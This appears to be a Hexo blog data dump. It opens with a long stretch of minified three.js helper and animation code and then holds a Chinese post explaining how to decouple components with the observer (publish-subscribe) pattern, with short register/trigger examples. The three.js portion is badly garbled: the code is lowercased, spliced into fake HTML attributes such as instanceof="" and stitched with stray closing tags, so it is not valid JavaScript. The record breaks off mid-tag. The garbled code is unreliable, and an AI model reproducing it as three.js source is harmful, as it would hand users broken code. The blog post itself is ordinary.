instanceof=\"\" three.bone&&(b.vertices.push(new=\"\" three.vector3),b.vertices.push(new=\"\" three.vector3),b.colors.push(new=\"\" three.color(0,0,1)),b.colors.push(new=\"\" three.color(0,1,0)));b.dynamic=\"!0;c=new\" three.linebasicmaterial({vertexcolors:three.vertexcolors,depthtest:!1,depthwrite:!1,transparent:!0});three.linesegments.call(this,b,c);this.root=\"a;this.matrix=a.matrixWorld;\" this.matrixautoupdate=\"!1;this.update()};THREE.SkeletonHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.SkeletonHelper.prototype.constructor=THREE.SkeletonHelper;THREE.SkeletonHelper.prototype.getBoneList=function(a){var\" b=\"[];a\" three.bone&&b.push(a);for(var=\"\" c=\"0;c<a.children.length;c++)b.push.apply(b,this.getBoneList(a.children[c]));return\" b};=\"\" three.skeletonhelper.prototype.update=\"function(){for(var\" a=\"this.geometry,b=(new\" three.matrix4).getinverse(this.root.matrixworld),c=\"new\" three.matrix4,d=\"0,e=0;e<this.bones.length;e++){var\" f=\"this.bones[e];f.parent\" three.bone&&(c.multiplymatrices(b,f.matrixworld),a.vertices[d].setfrommatrixposition(c),c.multiplymatrices(b,f.parent.matrixworld),a.vertices[d+1].setfrommatrixposition(c),d+=\"2)}a.verticesNeedUpdate=!0;a.computeBoundingSphere()};\" three.spotlighthelper=\"function(a){THREE.Object3D.call(this);this.light=a;this.light.updateMatrixWorld();this.matrix=a.matrixWorld;this.matrixAutoUpdate=!1;a=new\" three.buffergeometry;for(var=\"\">c;c++,d++){var e=c/32*Math.PI*2,f=d/32*Math.PI*2;b.push(Math.cos(e),Math.sin(e),1,Math.cos(f),Math.sin(f),1)}a.addAttribute(\"position\",new THREE.Float32Attribute(b,3));b=new THREE.LineBasicMaterial({fog:!1});this.cone=new THREE.LineSegments(a,\nb);this.add(this.cone);this.update()};THREE.SpotLightHelper.prototype=Object.create(THREE.Object3D.prototype);THREE.SpotLightHelper.prototype.constructor=THREE.SpotLightHelper;THREE.SpotLightHelper.prototype.dispose=function(){this.cone.geometry.dispose();this.cone.material.dispose()};\nTHREE.SpotLightHelper.prototype.update=function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(){var c=this.light.distance?this.light.distance:1E3,d=c*Math.tan(this.light.angle);this.cone.scale.set(d,d,c);a.setFromMatrixPosition(this.light.matrixWorld);b.setFromMatrixPosition(this.light.target.matrixWorld);this.cone.lookAt(b.sub(a));this.cone.material.color.copy(this.light.color).multiplyScalar(this.light.intensity)}}();\nTHREE.VertexNormalsHelper=function(a,b,c,d){this.object=a;this.size=void 0!==b?b:1;a=void 0!==c?c:16711680;d=void 0!==d?d:1;b=0;c=this.object.geometry;c instanceof THREE.Geometry?b=3*c.faces.length:c instanceof THREE.BufferGeometry&&(b=c.attributes.normal.count);c=new THREE.BufferGeometry;b=new THREE.Float32Attribute(6*b,3);c.addAttribute(\"position\",b);THREE.LineSegments.call(this,c,new THREE.LineBasicMaterial({color:a,linewidth:d}));this.matrixAutoUpdate=!1;this.update()};\nTHREE.VertexNormalsHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.VertexNormalsHelper.prototype.constructor=THREE.VertexNormalsHelper;\nTHREE.VertexNormalsHelper.prototype.update=function(){var a=new THREE.Vector3,b=new THREE.Vector3,c=new THREE.Matrix3;return function(){var d=[\"a\",\"b\",\"c\"];this.object.updateMatrixWorld(!0);c.getNormalMatrix(this.object.matrixWorld);var e=this.object.matrixWorld,f=this.geometry.attributes.position,g=this.object.geometry;if(g instanceof THREE.Geometry)for(var h=g.vertices,k=g.faces,l=g=0,n=k.length;l<n;l++)for(var p=\"k[l],m=0,q=p.vertexNormals.length;m<q;m++){var\" r=\"p.vertexNormals[m];a.copy(h[p[d[m]]]).applyMatrix4(e);\" b.copy(r).applymatrix3(c).normalize().multiplyscalar(this.size).add(a);f.setxyz(g,a.x,a.y,a.z);g+=\"1;f.setXYZ(g,b.x,b.y,b.z);g+=1}else\" if(g=\"\" instanceof=\"\" three.buffergeometry)for(d=\"g.attributes.position,h=g.attributes.normal,m=g=0,q=d.count;m<q;m++)a.set(d.getX(m),d.getY(m),d.getZ(m)).applyMatrix4(e),b.set(h.getX(m),h.getY(m),h.getZ(m)),b.applyMatrix3(c).normalize().multiplyScalar(this.size).add(a),f.setXYZ(g,a.x,a.y,a.z),g+=1,f.setXYZ(g,b.x,b.y,b.z),g+=1;f.needsUpdate=!0;return\" this}}();=\"\" three.wireframehelper=\"function(a,b){var\" c=\"void\" 0!=\"=b?b:16777215;THREE.LineSegments.call(this,new\" three.wireframegeometry(a.geometry),new=\"\" three.linebasicmaterial({color:c}));this.matrix=\"a.matrixWorld;this.matrixAutoUpdate=!1};THREE.WireframeHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.WireframeHelper.prototype.constructor=THREE.WireframeHelper;THREE.ImmediateRenderObject=function(a){THREE.Object3D.call(this);this.material=a;this.render=function(a){}};\" three.immediaterenderobject.prototype=\"Object.create(THREE.Object3D.prototype);THREE.ImmediateRenderObject.prototype.constructor=THREE.ImmediateRenderObject;THREE.MorphBlendMesh=function(a,b){THREE.Mesh.call(this,a,b);this.animationsMap={};this.animationsList=[];var\" three.morphblendmesh.prototype.createanimation=\"function(a,b,c,d){b={start:b,end:c,length:c-b+1,fps:d,duration:(c-b)/d,lastFrame:0,currentFrame:0,active:!1,time:0,direction:1,weight:1,directionBackwards:!1,mirroredLoop:!1};this.animationsMap[a]=b;this.animationsList.push(b)};\" three.morphblendmesh.prototype.autocreateanimations=\"function(a){for(var\" b=\"/([a-z]+)_?(\\d+)/i,c,d={},e=this.geometry,f=0,g=e.morphTargets.length;f<g;f++){var\" h=\"e.morphTargets[f].name.match(b);if(h&&1<h.length){var\" k=\"h[1];d[k]||(d[k]={start:Infinity,end:-Infinity});h=d[k];f<h.start&&(h.start=f);f\">h.end&&(h.end=f);c||(c=k)}}for(k in d)h=d[k],this.createAnimation(k,h.start,h.end,a);this.firstAnimation=c};\nTHREE.MorphBlendMesh.prototype.setAnimationDirectionForward=function(a){if(a=this.animationsMap[a])a.direction=1,a.directionBackwards=!1};THREE.MorphBlendMesh.prototype.setAnimationDirectionBackward=function(a){if(a=this.animationsMap[a])a.direction=-1,a.directionBackwards=!0};THREE.MorphBlendMesh.prototype.setAnimationFPS=function(a,b){var c=this.animationsMap[a];c&&(c.fps=b,c.duration=(c.end-c.start)/c.fps)};\nTHREE.MorphBlendMesh.prototype.setAnimationDuration=function(a,b){var c=this.animationsMap[a];c&&(c.duration=b,c.fps=(c.end-c.start)/c.duration)};THREE.MorphBlendMesh.prototype.setAnimationWeight=function(a,b){var c=this.animationsMap[a];c&&(c.weight=b)};THREE.MorphBlendMesh.prototype.setAnimationTime=function(a,b){var c=this.animationsMap[a];c&&(c.time=b)};THREE.MorphBlendMesh.prototype.getAnimationTime=function(a){var b=0;if(a=this.animationsMap[a])b=a.time;return b};\nTHREE.MorphBlendMesh.prototype.getAnimationDuration=function(a){var b=-1;if(a=this.animationsMap[a])b=a.duration;return b};THREE.MorphBlendMesh.prototype.playAnimation=function(a){var b=this.animationsMap[a];b?(b.time=0,b.active=!0):console.warn(\"THREE.MorphBlendMesh: animation[\"+a+\"] undefined in .playAnimation()\")};THREE.MorphBlendMesh.prototype.stopAnimation=function(a){if(a=this.animationsMap[a])a.active=!1};\nTHREE.MorphBlendMesh.prototype.update=function(a){for(var b=0,c=this.animationsList.length;b<c;b++){var d=\"this.animationsList[b];if(d.active){var\" e=\"d.duration/d.length;d.time+=d.direction*a;if(d.mirroredLoop){if(d.time\">d.duration||0>d.time)d.direction*=-1,d.time>d.duration&&(d.time=d.duration,d.directionBackwards=!0),0>d.time&&(d.time=0,d.directionBackwards=!1)}else d.time%=d.duration,0>d.time&&(d.time+=d.duration);var f=d.start+THREE.Math.clamp(Math.floor(d.time/e),0,d.length-1),g=d.weight;f!==d.currentFrame&&\n(this.morphTargetInfluences[d.lastFrame]=0,this.morphTargetInfluences[d.currentFrame]=1*g,this.morphTargetInfluences[f]=0,d.lastFrame=d.currentFrame,d.currentFrame=f);e=d.time%e/e;d.directionBackwards&&(e=1-e);d.currentFrame!==d.lastFrame?(this.morphTargetInfluences[d.currentFrame]=e*g,this.morphTargetInfluences[d.lastFrame]=(1-e)*g):this.morphTargetInfluences[d.currentFrame]=g}}};\n</c;b++){var></n;l++)for(var></this.bones.length;c++)this.bones[c].parent></h;g++)b.vertices[a[g]].copy(d)}var></c.y?this.quaternion.set(0,0,0,1):-.99999></l;a++)for(p=0;3></n;++g){a=e[g];p=a.start;m=a.count;a=p;for(var></l;a++)for(p=0;2></n;l++)this.vertices[l].multiplyscalar(c);this.mergevertices();this.computefacenormals();this.boundingsphere=new></n;l+=3)e(new></e[0].dot(h.crossvectors(f[0],f[b-1]))&&(d=-d),l=1;l<b;l++)f[l].applymatrix4(k.makerotationaxis(e[l],d*l)),g[l].crossvectors(e[l],f[l])};></d;c++)this.addshape(a[c],b);return></f;e++){var></-number.epsilon?f<-number.epsilon&&(a=!0):math.sign(e)===math.sign(g)&&(a=!0),a?(c=-e,a=d,d=math.sqrt(h)):(c=d,a=e,d=math.sqrt(h></=d)l=k[g.vert1],e.push(l.x),e.push(l.y),e.push(l.z),l=k[g.vert2],e.push(l.x),e.push(l.y),e.push(l.z);this.addattribute(\"position\",new></q;g++)for(var></h?0:(math.floor(math.abs(h)></=a.x&&a.x<=g.x||g.x<=a.x&&a.x<=h.x))return!0}return></g.y||a.y></d;c++)b+=this.curves[c].getlength(),a.push(b);return></a&&(a=1);b=this.getpoint(b);return></k)h=d-1;else{h=d;break}d=h;if(c[d]===f)return></=a;b++)c.push(this.getpoint(b></h.length;p++){z=h[p];n=-1;for(p=0;p<l.length;p++)if(y=l[p],a=z.x+\":\"+z.y+\":\"+y,void></h.length;c++)if(e=c+1,e%=h.length,e=d(a,b,h[c],h[e],!0),0<e.length)return!0;return!1}function></a?0<=e&&0<=b:0<=e||0<=b):0<e}var></=d?[g,h]:[g,l]}function></a||a<y)return[];k=l*n-k*p;if(0<k||k<y)return[]}if(0===k)return!f||0!==a&&a!==y?[a]:[];if(k===y)return!f||0!==a&&a!==y?[b]:[];if(0===a)return[d];if(a===y)return[e];f=k></y){if(0></c;g++,k++)e[g]=e[k];c--;l=2*c}}return></c;n++)if(u=a[e[n]].x,v=a[e[n]].y,!(u===p&&v===m||u===q&&v===r||u===s&&v===t)&&(i=u-p,b=v-m,f=u-q,k=v-r,u-=s,v-=t,f=c*k-w*f,i=y*b-a*i,b=e*v-z*u,f></=g&&(g=0);h=g+1;c<=h&&(h=0);k=h+1;c<=k&&(k=0);var></three.shapeutils.area(a))for(h=0;h<c;h++)e[h]=h;else></n;o++){var></e)return></h;m++)k=p[m],b.format!==three.rgbaformat&&b.format!==three.rgbformat?-1<c.getcompressedtextureformats().indexof(b)?c.compressedteximage2d(a.texture_cube_map_positive_x+s,m,b,k.width,k.height,0,k.data):console.warn(\"three.webglrenderer:></b.version&&m.__version!==b.version){var></parseint(c);b++)a+=d.replace(></\"+></m;p+=3){var></=b&&b<=a.width-d&&0<=c&&c<=a.height-e&&x.readpixels(b,c,d,e,u(k.format),u(k.type),f):console.error(\"three.webglrenderer.readrendertargetpixels:></c;b++)this.lensflares.push(a.lensflares[b]);return></f;e++)d[e].object.visible=!1}}}(),tojson:function(a){a=three.object3d.prototype.tojson.call(this,a);a.object.levels=[];for(var></k;f+=3){if(u=z[f],i=z[f+1],b=z[f+2],a=c(this,v,e,w,y,u,i,b))a.faceindex=math.floor(f></this.geometry.morphtargets.length){this.morphtargetbase=-1;this.morphtargetinfluences=[];this.morphtargetdictionary={};for(var></d.near||s></l-1;g+=p)s=b.distancesqtosegment(k[g],k[g+1],n,h),s></d.near||s></r;g+=p)k.fromarray(q,3*g),l.fromarray(q,3*g+3),s=b.distancesqtosegment(k,l,n,h),s></d.near||s></q;p++){var></n){var></a.y)switch(this.wrapt){case></a.x)switch(this.wraps){case></this.alphatest&&(d.alphatest=this.alphatest);!0===this.premultipliedalpha&&(d.premultipliedalpha=this.premultipliedalpha);!0===this.wireframe&&(d.wireframe=this.wireframe);1<this.wireframelinewidth&&(d.wireframelinewidth=this.wireframelinewidth);c&&(c=b(a.textures),></g;d+=b)c.skinweights.push(new></e;d++)for(t=a.uvs[d],c.facevertexuvs[d][h]=[],g=0;3></d;c+=2){var></=d)for(d=0;d!==e;++d)a[b+d]=a[c+d]},_slerp:function(a,b,c,d,e){three.quaternion.slerpflat(a,b,a,b,a,c,d)},_lerp:function(a,b,c,d,e){for(var></=f;++e){var></d){var></this.tracks.length;a++)this.tracks[a].trim(0,this.duration);return></a?c:0,this._mixer.dispatchevent({type:\"finished\",action:this,direction:0<a?1:-1})):(0===g?(a=0></=a?(e=0,this._setendings(!0,0===this.repetitions,></a){b=this._interpolants;for(var></=f;f--)for(e=a[f],this.faces.splice(e,></b[e]?d=e:c=e+1;d=b[c];e=b[c-1];if(void></d;)e=c+d></f&&(c=2,e=f);for(f=c-2;;){if(void></b.length;k++){b[k].closestpointtopoint(c,!0,d);var></c;a++)b=this.points[a],d[a]=[b.x,b.y,b.z];return></a.length;b++)this.points[b]={x:a[b][0],y:a[b][1],z:a[b][2]}};this.getpoint=function(a){e=(this.points.length-1)*a;f=math.floor(e);g=e-f;c[0]=0===f?f:f-1;c[1]=f;c[2]=f></=b)return></=b)return></b},intersectsbox:function(a){return></a||0></f?void></f.normal.x?c.min.x:c.max.x;b.x=0<f.normal.x?></a)return!1;return!0},intersectsbox:function(){var></=this.radius*this.radius},distancetopoint:function(a){return></g;f++)e=math.max(e,d.distancetosquared(b[f]));this.radius=math.sqrt(e);return></=c?c:d,b)},intersectsbox:function(){var></d||d!==d)d=g;return></d||d!==></=d?(c=(a.min.x-h.x)*d,d*=a.max.x-h.x):(c=(a.max.x-h.x)*d,d*=a.min.x-h.x);0<=f?(e=(a.min.y-h.y)*f,f*=a.max.y-h.y):(e=(a.max.y-h.y)*f,f*=a.min.y-h.y);if(c></=a.radius},distancetoplane:function(a){var></=q?(h=1></m?(d=k*n-l,e=k*l-n,q=h*m,0<=d?e></arguments.length&&console.error(\"three.matrix3:></=b.radius*b.radius}}(),intersectsplane:function(a){var></this.min.y||a.min.y></=a.min.x&&a.max.x<=this.max.x&&this.min.y<=a.min.y&&a.max.y<=this.max.y&&this.min.z<=a.min.z&&a.max.z<=this.max.z?!0:!1},getparameter:function(a,b){return(b||new></this.min.y||a.y></c;b++)this.expandbypoint(a[b]);return></k;h+=3){var></this.min.y||a.min.y></=a.min.x&&a.max.x<=this.max.x&&this.min.y<=a.min.y&&a.max.y<=this.max.y?!0:!1},getparameter:function(a,b){return(b||new></this.min.y||a.y></c;b++)this.expandbypoint(a[b]);return></=m?1:-1,r=1-m*m;r></=g)return></d?6:0);break;case></a.length&&></2></d&&(d-=1);return></a?1:+a});void>"}],"Post":[{"title":"使用观察者模式（发布-订阅模式）对抽象组件与业务组件进行解耦","catalog":true,"date":"2017-09-04T14:12:16.000Z","subtitle":null,"header-img":"post/IMG_2807.JPG","_content":"最近在重构一处功能，发现抽象组件居然依赖了业务组件的代码，从window作用域call了业务组件提供的方法，这里的强耦合让我强迫症又犯了，本着每天进步一点点的原则，毅然决然的进行解耦合。\n\n我们在学习面向对象的时候，有一条设计原则叫**依赖倒置原则**：\n>* A.高层次的模块不应该依赖于低层次的模块，他们都应该依赖于抽象。\n>* B.抽象不应该依赖于具体实现，具体实现应该依赖于抽象。\n\n其实用通俗点的话来讲，就是通用模块应该高冷，不应该为了某个页面的需求变动或某项功能的改变就要我专门对你进行适配，写一些偏业务的代码，比如一个电脑操作系统更新，兼容性问题一般不会由操作系统厂商来解决，都是软件开发商来适配更新。放到代码上也是同理，因为你不知道有多少业务模块回来使用你，所以要保持必要的抽象性。\n\n简单描述下我遇到的问题，组件A其实是为页面B服务的，但是大多数页面都需要通过组件A的功能进行操作，跳转到页面B，然后组件A再将刚才的操作告诉B以进行处理。所以这里之前我就写了**依赖于具体**的代码。往往很残酷的是遇到需求变更，这里处理可能要移动到C页面，或是增加D和E页面都要处理，于是就很尴尬了，难道每增加一个页面我就得去动A组件？于是我想到了观察者模式（很多又称发布-订阅模式）\n1. 组件A与页面B撇清关系\n2. 组件A来发布一个消息，我管你接收不接收？反正我正常发出去了\n3. 页面B甚至C、D、E、F...来订阅这个消息以进行处理\n4. 那么这样就完成了组件与具体实现的解耦\n下面是实现的代码\n\nA.js 组件A\n```js\n\n// 用于存放订阅者的队列\nconst _MESSAGES = {};\n\n/**\n * 向外提供一个用于订阅事件的函数\n * @param type 订阅消息的类型\n * @param fn 消息发生时的回调函数\n */\nexport function register( type, fn ) {\n  _MESSAGES[ type ] ? _MESSAGES[ type ].push( fn ) : _MESSAGES[ type ] = [ fn ];\n}\n/**\n * 再提供提供一个用于发布事件的函数，组件可用，页面也可以用\n * @param type 发布事件的类型\n * @param backParama 发布事件时携带的参数\n */\nexport function trigger( type, ...backParama ) {\n  return _MESSAGES[ type ] && _MESSAGES[ type ].forEach( item => item.apply( this, backParama ) );\n}\n\n//  然后是组件本身的一些操作做完后\n// some code\n// 发布一个叫message的事件，并回传一个叫'hello world'的字符串\ntrigger( 'message', 'hello world!' );\n```\nB.js 页面B，依赖组件A\n```js\n// 引入\nimport { register } from 'A';\n\n// 组件A发布叫message的事件\nregister( 'message', function( data ) {\n  // 在回调里处理我们的事情\n} );\n```\n\n这样我们就完成了一个简单的订阅-发布模式，当然我们还可以一步步对其进行完善，比如我们要取消订阅，增加一个叫`remove`的函数用于取消对抽象组件的消息订阅。\n\n其实观察者模式在我们代码中无处不在，比如我们在多处对某个`dom`元素进行事件绑定，事件发生后会按照订阅顺序对订阅者进行分发。","source":"_posts/Observer.md","raw":"---\ntitle: 使用观察者模式（发布-订阅模式）对抽象组件与业务组件进行解耦\ncatalog: true\ndate: 2017-09-04 22:12:16\nsubtitle:\nheader-img: post/IMG_2807.JPG\ntags:\n- 订阅者模式\n- Observer\n- 设计模式\n---\n最近在重构一处功能，发现抽象组件居然依赖了业务组件的代码，从window作用域call了业务组件提供的方法，这里的强耦合让我强迫症又犯了，本着每天进步一点点的原则，毅然决然的进行解耦合。\n\n我们在学习面向对象的时候，有一条设计原则叫**依赖倒置原则**：\n>* A.高层次的模块不应该依赖于低层次的模块，他们都应该依赖于抽象。\n>* B.抽象不应该依赖于具体实现，具体实现应该依赖于抽象。\n\n其实用通俗点的话来讲，就是通用模块应该高冷，不应该为了某个页面的需求变动或某项功能的改变就要我专门对你进行适配，写一些偏业务的代码，比如一个电脑操作系统更新，兼容性问题一般不会由操作系统厂商来解决，都是软件开发商来适配更新。放到代码上也是同理，因为你不知道有多少业务模块回来使用你，所以要保持必要的抽象性。\n\n简单描述下我遇到的问题，组件A其实是为页面B服务的，但是大多数页面都需要通过组件A的功能进行操作，跳转到页面B，然后组件A再将刚才的操作告诉B以进行处理。所以这里之前我就写了**依赖于具体**的代码。往往很残酷的是遇到需求变更，这里处理可能要移动到C页面，或是增加D和E页面都要处理，于是就很尴尬了，难道每增加一个页面我就得去动A组件？于是我想到了观察者模式（很多又称发布-订阅模式）\n1. 组件A与页面B撇清关系\n2. 组件A来发布一个消息，我管你接收不接收？反正我正常发出去了\n3. 页面B甚至C、D、E、F...来订阅这个消息以进行处理\n4. 那么这样就完成了组件与具体实现的解耦\n下面是实现的代码\n\nA.js 组件A\n```js\n\n// 用于存放订阅者的队列\nconst _MESSAGES = {};\n\n/**\n * 向外提供一个用于订阅事件的函数\n * @param type 订阅消息的类型\n * @param fn 消息发生时的回调函数\n */\nexport function register( type, fn ) {\n  _MESSAGES[ type ] ? _MESSAGES[ type ].push( fn ) : _MESSAGES[ type ] = [ fn ];\n}\n/**\n * 再提供提供一个用于发布事件的函数，组件可用，页面也可以用\n * @param type 发布事件的类型\n * @param backParama 发布事件时携带的参数\n */\nexport function trigger( type, ...backParama ) {\n  return _MESSAGES[ type ] && _MESSAGES[ type ].forEach( item => item.apply( this, backParama ) );\n}\n\n//  然后是组件本身的一些操作做完后\n// some code\n// 发布一个叫message的事件，并回传一个叫'hello world'的字符串\ntrigger( 'message', 'hello world!' );\n```\nB.js 页面B，依赖组件A\n```js\n// 引入\nimport { register } from 'A';\n\n// 组件A发布叫message的事件\nregister( 'message', function( data ) {\n  // 在回调里处理我们的事情\n} );\n```\n\n这样我们就完成了一个简单的订阅-发布模式，当然我们还可以一步步对其进行完善，比如我们要取消订阅，增加一个叫`remove`的函数用于取消对抽象组件的消息订阅。\n\n其实观察者模式在我们代码中无处不在，比如我们在多处对某个`dom`元素进行事件绑定，事件发生后会按照订阅顺序对订阅者进行分发。","slug":"Observer","published":1,"updated":"2017-09-04T15:06:44.625Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cje9esjv50001i4ucv2kase7o","content":"<p>最近在重构一处功能，发现抽象组件居然依赖了业务组件的代码，从window作用域call了业务组件提供的方法，这里的强耦合让我强迫症又犯了，本着每天进步一点点的原则，毅然决然的进行解耦合。</p>\n<p>我们在学习面向对象的时候，有一条设计原则叫<strong>依赖倒置原则</strong>：</p>\n<blockquote>\n<ul>\n<li>A.高层次的模块不应该依赖于低层次的模块，他们都应该依赖于抽象。</li>\n<li>B.抽象不应该依赖于具体实现，具体实现应该依赖于抽象。</li>\n</ul>\n</blockquote>\n<p>其实用通俗点的话来讲，就是通用模块应该高冷，不应该为了某个页面的需求变动或某项功能的改变就要我专门对你进行适配，写一些偏业务的代码，比如一个电脑操作系统更新，兼容性问题一般不会由操作系统厂商来解决，都是软件开发商来适配更新。放到代码上也是同理，因为你不知道有多少业务模块回来使用你，所以要保持必要的抽象性。</p>\n<p>简单描述下我遇到的问题，组件A其实是为页面B服务的，但是大多数页面都需要通过组件A的功能进行操作，跳转到页面B，然后组件A再将刚才的操作告诉B以进行处理。所以这里之前我就写了<strong>依赖于具体</strong>的代码。往往很残酷的是遇到需求变更，这里处理可能要移动到C页面，或是增加D和E页面都要处理，于是就很尴尬了，难道每增加一个页面我就得去动A组件？于是我想到了观察者模式（很多又称发布-订阅模式）</p>\n<ol>\n<li>组件A与页面B撇清关系</li>\n<li>组件A来发布一个消息，我管你接收不接收？反正我正常发出去了</li>\n<li>页面B甚至C、D、E、F…来订阅这个消息以进行处理</li>\n<li>那么这样就完成了组件与具体实现的解耦<br>\n下面是实现的代码</li>\n</ol>\n<p>A.js 组件A</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 用于存放订阅者的队列</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> _MESSAGES = &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 向外提供一个用于订阅事件的函数</span></span><br><span class=\"line\"><span class=\"comment\"> * @param type 订阅消息的类型</span></span><br><span class=\"line\"><span class=\"comment\"> * @param fn 消息发生时的回调函数</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">register</span>(<span class=\"params\"> type, fn </span>) </span>&#123;</span><br><span class=\"line\">  _MESSAGES[ type ] ? _MESSAGES[ type ].push( fn ) : _MESSAGES[ type ] = [ fn ];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 再提供提供一个用于发布事件的函数，组件可用，页面也可以用</span></span><br><span class=\"line\"><span class=\"comment\"> * @param type 发布事件的类型</span></span><br><span class=\"line\"><span class=\"comment\"> * @param backParama 发布事件时携带的参数</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">trigger</span>(<span class=\"params\"> type, ...backParama </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> _MESSAGES[ type ] &amp;&amp; _MESSAGES[ type ].forEach( <span class=\"function\"><span class=\"params\">item</span> =&gt;</span> item.apply( <span class=\"keyword\">this</span>, backParama ) );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//  然后是组件本身的一些操作做完后</span></span><br><span class=\"line\"><span class=\"comment\">// some code</span></span><br><span class=\"line\"><span class=\"comment\">// 发布一个叫message的事件，并回传一个叫'hello world'的字符串</span></span><br><span class=\"line\">trigger( <span class=\"string\">'message'</span>, <span class=\"string\">'hello world!'</span> );</span><br></pre></td></tr></table></figure>\n<p>B.js 页面B，依赖组件A</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 引入</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; register &#125; <span class=\"keyword\">from</span> <span class=\"string\">'A'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 组件A发布叫message的事件</span></span><br><span class=\"line\">register( <span class=\"string\">'message'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> data </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 在回调里处理我们的事情</span></span><br><span class=\"line\">&#125; );</span><br></pre></td></tr></table></figure>\n<p>这样我们就完成了一个简单的订阅-发布模式，当然我们还可以一步步对其进行完善，比如我们要取消订阅，增加一个叫<code>remove</code>的函数用于取消对抽象组件的消息订阅。</p>\n<p>其实观察者模式在我们代码中无处不在，比如我们在多处对某个<code>dom</code>元素进行事件绑定，事件发生后会按照订阅顺序对订阅者进行分发。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>最近在重构一处功能，发现抽象组件居然依赖了业务组件的代码，从window作用域call了业务组件提供的方法，这里的强耦合让我强迫症又犯了，本着每天进步一点点的原则，毅然决然的进行解耦合。</p>\n<p>我们在学习面向对象的时候，有一条设计原则叫<strong>依赖倒置原则</strong>：</p>\n<blockquote>\n<ul>\n<li>A.高层次的模块不应该依赖于低层次的模块，他们都应该依赖于抽象。</li>\n<li>B.抽象不应该依赖于具体实现，具体实现应该依赖于抽象。</li>\n</ul>\n</blockquote>\n<p>其实用通俗点的话来讲，就是通用模块应该高冷，不应该为了某个页面的需求变动或某项功能的改变就要我专门对你进行适配，写一些偏业务的代码，比如一个电脑操作系统更新，兼容性问题一般不会由操作系统厂商来解决，都是软件开发商来适配更新。放到代码上也是同理，因为你不知道有多少业务模块回来使用你，所以要保持必要的抽象性。</p>\n<p>简单描述下我遇到的问题，组件A其实是为页面B服务的，但是大多数页面都需要通过组件A的功能进行操作，跳转到页面B，然后组件A再将刚才的操作告诉B以进行处理。所以这里之前我就写了<strong>依赖于具体</strong>的代码。往往很残酷的是遇到需求变更，这里处理可能要移动到C页面，或是增加D和E页面都要处理，于是就很尴尬了，难道每增加一个页面我就得去动A组件？于是我想到了观察者模式（很多又称发布-订阅模式）</p>\n<ol>\n<li>组件A与页面B撇清关系</li>\n<li>组件A来发布一个消息，我管你接收不接收？反正我正常发出去了</li>\n<li>页面B甚至C、D、E、F…来订阅这个消息以进行处理</li>\n<li>那么这样就完成了组件与具体实现的解耦<br>\n下面是实现的代码</li>\n</ol>\n<p>A.js 组件A</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 用于存放订阅者的队列</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> _MESSAGES = &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 向外提供一个用于订阅事件的函数</span></span><br><span class=\"line\"><span class=\"comment\"> * @param type 订阅消息的类型</span></span><br><span class=\"line\"><span class=\"comment\"> * @param fn 消息发生时的回调函数</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"function\"><span 